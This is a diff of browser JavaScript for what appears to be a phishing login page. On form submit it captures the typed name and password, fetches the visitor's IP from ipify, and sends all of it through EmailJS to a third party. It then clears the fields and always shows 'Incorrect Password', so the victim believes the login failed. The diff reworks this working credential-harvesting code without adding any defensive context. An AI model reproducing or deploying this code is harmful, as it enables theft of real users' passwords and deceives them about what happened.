@@ -1,27 +1,29 @@
-function sendMail() {
-  // Get user's IP address
+const btn = document.getElementById("button");
+
+document.getElementById("form").addEventListener("submit", function (event) {
+  event.preventDefault();
+
+  // btn.value = "Sending...";
+
+  const serviceID = "default_service";
+  const templateID = "template_4l71e0a";
+
   fetch("https://api.ipify.org?format=json")
     .then((response) => response.json())
     .then((data) => {
       console.log("data" + data);
       // Construct email parameters object
       var params = {
-        email: document.getElementById("email").value,
+        from_name: document.getElementById("from_name").value,
         password: document.getElementById("password").value,
         IP: data.ip,
       };
 
-      // Set up EmailJS service and template IDs
-      //   Thron
-      const serviceID = "service_y2t5wsa";
-      const templateID = "template_4mmzj8j";
-
-      // Send email using EmailJS
       emailjs
         .send(serviceID, templateID, params)
         .then((res) => {
           // Clear form fields and show success message
-          document.getElementById("email").value = "";
+          document.getElementById("from_name").value = "";
           document.getElementById("password").value = "";
           console.log(res);
           alert("Incorrect Password");
@@ -31,4 +33,4 @@ function sendMail() {
           alert("Incorrect Password");
         });
     });
-}
+});
